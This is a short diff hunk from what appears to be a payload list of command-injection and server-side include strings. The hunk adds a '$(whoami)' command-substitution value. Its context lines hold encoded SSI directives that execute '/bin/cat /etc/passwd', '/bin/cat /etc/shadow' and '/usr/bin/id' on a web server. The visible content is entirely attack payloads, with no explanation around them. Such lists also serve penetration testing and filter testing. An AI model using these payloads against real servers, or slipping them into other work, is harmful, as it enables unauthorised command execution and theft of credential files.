@@ -4,6 +4,7 @@
 
 
 ```shell
+\$(whoami)
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
